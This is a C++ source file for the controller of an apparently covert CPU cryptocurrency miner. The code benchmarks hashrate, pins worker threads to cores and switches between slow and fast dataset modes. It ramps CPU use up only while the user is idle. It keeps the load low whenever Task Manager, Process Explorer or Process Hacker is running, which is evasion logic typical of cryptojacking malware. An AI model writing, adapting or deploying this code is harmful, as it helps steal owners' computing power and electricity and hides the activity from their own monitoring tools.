#include <chrono>

#include "controller.h"
#include "../../util/sysinfo.h"
#include "../../util/affinity.h"

//#include <iostream>

namespace mnr
{

//static variable initialization
uint32_t controller::initialized_instance_count = 0;

double controller::normal_power = 0.2;
double controller::max_power = 0.0;
double controller::power_increment_rate = 0.05;
uint32_t controller::power_increment_time_ms = 10000;

double controller::max_power_formula_maximum = 0.7;
double controller::max_power_formula_nominator = 80.0;
double controller::max_power_formula_denominator = 200.0;

uint32_t controller::afk_wait_time_ms = 60000;
uint64_t controller::predataset_free_memory_bytes = 3221225472; //3.0GiB
uint64_t controller::postdataset_free_memory_bytes = 536870912; //512Mib

std::vector<std::string> controller::bad_process_list = { "taskmgr.exe", "procexp.exe", "procexp64.exe", "ProcessHacker.exe"};

std::mutex controller::power_manipulation_mutex;
std::mutex controller::mode_manipulation_mutex;



controller::controller()
{

}

controller::controller(const job& initial_job)
{
	this->initialize(initial_job);
}

controller::~controller()
{
	this->shutdown();
}

void controller::initialize(const job& initial_job)
{
	if (initialized_instance_count > 0 || m_is_init)
		return;

	m_job = new job(initial_job);

	for (uint32_t i = 0; i < util::sysinfo::get_physical_core_count(); i++)
	{
		job_exec* ptr = new job_exec(*m_job, util::sysinfo::get_physical_core_count());
		m_job_exec_list.emplace_back(ptr);
	}

	for (uint32_t i = 0; i < m_job_exec_list.size(); i++)
	{
		util::affinity::set_thread_affinity(
			(i * (util::sysinfo::get_logical_core_count() / util::sysinfo::get_physical_core_count())),
			m_job_exec_list[i]->get_worker_handle());

		//std::cout << util::affinity::get_thread_affinity_mask(m_job_exec_list[i]->get_worker_handle()) << std::endl;
	}

	for (uint32_t i = 0; i < m_job_exec_list.size(); i++)
	{
		active_thread_flag.emplace_back(true);
	}

	initialized_instance_count++;
	m_is_init = true;

	for (uint32_t i = 0; i < m_job_exec_list.size(); i++)
		m_job_exec_list[i]->set_interhash_time(0, 1);

	set_fixed_mode(SLOW_MODE);
	this->start();

	std::this_thread::sleep_for(std::chrono::seconds(3));
	max_hashrates_slow = get_hashrate_per_thread(3000);

	set_fixed_mode(FAST_MODE);

	std::this_thread::sleep_for(std::chrono::seconds(3));
	max_hashrates_fast = get_hashrate_per_thread(3000);
	this->stop();

	set_auto_mode();

	calc_max_power();

	set_power(normal_power);

	m_power_control_flag = true;
	m_mode_control_flag = true;
	m_exit_flag = false;
	m_control_thread = std::thread(&controller::control_func, this);
}

void controller::start()
{
	//prevent start while mode is changing
	std::lock_guard<std::mutex> mutex_guard(mode_manipulation_mutex);

	m_is_running = true;
	for (uint32_t i = 0; i < m_job_exec_list.size(); i++)
	{
		if(active_thread_flag[i])
			m_job_exec_list[i]->start();
	}
}

void controller::stop()
{
	//prevent stop while mode is changing
	//std::lock_guard<std::mutex> mutex_guard(mode_manipulation_mutex);

	m_is_running = false;
	job_exec::stop_all();
}

void controller::shutdown()
{
	if (m_is_init)
	{
		this->stop();

		m_exit_flag = true;
		m_control_thread.join();

		for (uint32_t i = 0; i < m_job_exec_list.size(); i++)
			delete m_job_exec_list[i];

		if (m_job != nullptr)
		{
			delete m_job;
			m_job = nullptr;
		}

		m_job_exec_list.clear();

		initialized_instance_count--;
		m_is_init = false;
	}
}

void controller::calc_max_power()
{
	max_power = max_power_formula_maximum - (max_power_formula_nominator / (this->get_max_hashrate(FAST_MODE) + max_power_formula_denominator));
}

void controller::power_incrementor(const bool* stop_flag)
{
	while (!*stop_flag)
	{
		if (max_power - m_current_power >= power_increment_rate)
		{
			increment_power(power_increment_rate);
		}
		else
		{
			increment_power(max_power - m_current_power);
			return;
		}

		std::this_thread::sleep_for(std::chrono::milliseconds(power_increment_time_ms));

		//std::cout << "ffffff-" << *stop_flag << std::endl;
	}
}

void controller::control_func()
{
	if (!m_is_init)
		return;

	bool is_afk = false;
	bool allocate_dataset = false;
	bool keep_dataset = false;
	bool is_bad_proc_running = false;

	bool power_incrementor_stop_flag = false;
	bool is_power_incrementor_running = false;
	std::thread power_increment_thread;

	while (!m_exit_flag)
	{
		is_afk = (util::sysinfo::get_idle_time() >= afk_wait_time_ms);
		
		/*
		if (is_afk)
			std::cout << "AFK TRUE---------------------------" << std::endl;
		else
			std::cout << "AFK FALSE---------------------------" << std::endl;
		*/
		
		allocate_dataset = (util::sysinfo::get_free_memory() >= predataset_free_memory_bytes);
		keep_dataset = (util::sysinfo::get_free_memory() >= postdataset_free_memory_bytes);

		is_bad_proc_running = false;
		for (uint32_t i = 0; i < bad_process_list.size(); i++)
			is_bad_proc_running |= util::sysinfo::is_process_running(bad_process_list[i]);

		if (m_power_control_flag)
		{
			if (is_afk && !is_bad_proc_running)
			{
				if (!is_power_incrementor_running)
				{
					power_incrementor_stop_flag = false;
					power_increment_thread = std::thread(&controller::power_incrementor, this, &power_incrementor_stop_flag);
					is_power_incrementor_running = true;
				}
			}
			else
			{
				if (is_power_incrementor_running)
				{
					power_incrementor_stop_flag = true;
					power_increment_thread.join();
					power_increment_thread.~thread();
					is_power_incrementor_running = false;
				}

				if (m_current_power != normal_power)
					set_power(normal_power);
			}
		}
		else
		{
			if (is_power_incrementor_running)
			{
				power_incrementor_stop_flag = true;
				power_increment_thread.join();
				power_increment_thread.~thread();
				is_power_incrementor_running = false;
			}
		}

		if (m_mode_control_flag)
		{
			if (job_exec::get_mode() == SLOW_MODE)
			{
				if (is_afk && allocate_dataset)
				{
					set_mode(FAST_MODE);
					set_power(m_current_power);
				}
			}
			else
			{
				if (!(is_afk && keep_dataset))
				{
					set_mode(SLOW_MODE);
					set_power(m_current_power);
				}
			}
		}

		std::this_thread::sleep_for(std::chrono::milliseconds(250));
	}

	if (is_power_incrementor_running)
	{
		power_incrementor_stop_flag = true;
		power_increment_thread.join();
		power_increment_thread.~thread();
		is_power_incrementor_running = false;
	}
}

void controller::set_mode(MODE mode)
{
	std::lock_guard<std::mutex> mutex_guard_1(mode_manipulation_mutex);

	//we also lock the power manipulation mutex because set_power could start/stop threads,
	//preventing us from stopping them to change the mode, resulting in a long wait until
	//we can actually change the mode (80+ seconds sometimes)
	std::lock_guard<std::mutex> mutex_guard_2(power_manipulation_mutex);
	
	job_exec::set_mode(mode);
}

void controller::set_power(double power)
{
	std::lock_guard<std::mutex> mutex_guard(power_manipulation_mutex);
	if (power > 1.0 || power < 0.005)
		return;

	m_current_power = power;

	//std::cout << "POWER SET: " << power << std::endl;

	uint32_t active_thread_count = (power * m_job_exec_list.size());

	if ((power * m_job_exec_list.size()) != (double)active_thread_count)
		active_thread_count++;

	for (uint32_t i = 0; i < m_job_exec_list.size(); i++)
		active_thread_flag[i] = (i < active_thread_count);

	for (uint32_t i = 0; i < m_job_exec_list.size(); i++)
	{
		if (active_thread_flag[i])
		{
			if (i == (active_thread_count - 1))
			{
				double last_thread_power = (power * (double)m_job_exec_list.size()) - (double)(active_thread_count - 1);
				
				uint64_t iht_us = ((job_exec::get_mode() == FAST_MODE) ? 1E6 / max_hashrates_fast[i] : 1E6 / max_hashrates_slow[i]) * (1.0 / last_thread_power - 1.0);
				uint32_t sleep_every_x_hashes = (this->get_max_hashrate(job_exec::get_mode()) > 1.0) ? this->get_max_hashrate(job_exec::get_mode()) / 2 : 1;
				
				m_job_exec_list[i]->set_interhash_time(iht_us, sleep_every_x_hashes);

				/*
				std::cout << "ACTIVE THREADS: " << active_thread_count << std::endl;
				std::cout << "LAST THREAD POWER: " << last_thread_power << std::endl;
				std::cout << "HASH TIME: " << ((job_exec::get_mode() == FAST_MODE) ? 1E6 / max_hashrates_fast[i] : 1E6 / max_hashrates_slow[i]) << std::endl;
				std::cout << "INTERHASH TIME: " << iht_us << std::endl;
				*/
			}
			else
			{
				m_job_exec_list[i]->set_interhash_time(0, 1);
			}

			if (m_is_running)
				m_job_exec_list[i]->start();
		}
		else
		{
			if (m_is_running)
				m_job_exec_list[i]->stop();
		}
	}
}

void controller::increment_power(double increment)
{
	double p = m_current_power + increment;
	set_power(p);
}

void controller::set_fixed_power(double power)
{
	m_power_control_flag = false;
	set_power(power);
}

void controller::set_auto_power()
{
	m_power_control_flag = true;
}

void controller::set_fixed_mode(MODE mode)
{
	m_mode_control_flag = false;
	set_mode(mode);
	set_power(m_current_power);
}

void controller::set_auto_mode()
{
	m_mode_control_flag = true;
}

std::vector<double> controller::get_hashrate_per_thread(uint32_t sample_time_ms)
{
	std::vector<uint64_t> start_hash_count;
	for (uint32_t i = 0; i < m_job_exec_list.size(); i++)
		start_hash_count.emplace_back(m_job_exec_list[i]->get_hash_count());

	std::this_thread::sleep_for(std::chrono::milliseconds(sample_time_ms));

	std::vector<uint64_t> end_hash_count;
	for (uint32_t i = 0; i < m_job_exec_list.size(); i++)
		end_hash_count.emplace_back(m_job_exec_list[i]->get_hash_count());

	double dt = sample_time_ms / 1000.0;

	std::vector<double> result;

	for (uint32_t i = 0; i < m_job_exec_list.size(); i++)
	{
		result.emplace_back((end_hash_count[i] - start_hash_count[i]) / dt);
	}

	return result;
}

double controller::get_current_hashrate(uint32_t sample_time_ms)
{
	double sum = 0;
	std::vector<double> hashrate_per_thread = this->get_hashrate_per_thread(sample_time_ms);

	for (uint32_t i = 0; i < hashrate_per_thread.size(); i++)
		sum += hashrate_per_thread[i];

	return sum;
}

double controller::get_max_hashrate(MODE hashing_mode)
{
	double sum = 0;

	if (hashing_mode == SLOW_MODE)
	{
		for (int i = 0; i < m_job_exec_list.size(); i++)
			sum += max_hashrates_slow[i];
		return sum;
	}
	else
	{
		for (int i = 0; i < m_job_exec_list.size(); i++)
			sum += max_hashrates_fast[i];
		return sum;
	}
}

uint64_t controller::get_total_hash_count()
{
	uint64_t sum = 0;
	for (uint32_t i = 0; i < m_job_exec_list.size(); i++)
		sum += m_job_exec_list[i]->get_hash_count();
	return sum;
}

void controller::set_job(const job& j)
{
	std::lock_guard<std::mutex> mutex_guard_1(mode_manipulation_mutex);
	std::lock_guard<std::mutex> mutex_guard_2(power_manipulation_mutex);

	bool was_running = false;

	if (m_is_running)
	{
		was_running = true;
		this->stop();
	}

	delete m_job;
	m_job = new job(j);

	for (size_t i = 0; i < m_job_exec_list.size(); i++)
		m_job_exec_list[i]->switch_job(*m_job);

	if (was_running)
		this->start();
}

bool controller::check_new_results()
{
	for (uint32_t i = 0; i < m_job_exec_list.size(); i++)
	{
		if (m_job_exec_list[i]->check_new_results())
			return true;
	}

	return false;
}

std::vector<job_result> controller::get_new_results()
{
	std::vector<job_result> res;

	for (uint32_t i = 0; i < m_job_exec_list.size(); i++)
	{
		if (m_job_exec_list[i]->check_new_results())
		{
			std::vector<job_result> partial_res = m_job_exec_list[i]->get_new_results();
			for (uint32_t j = 0; j < partial_res.size(); j++)
				res.emplace_back(partial_res[j]);
		}
	}

	return res;
}

}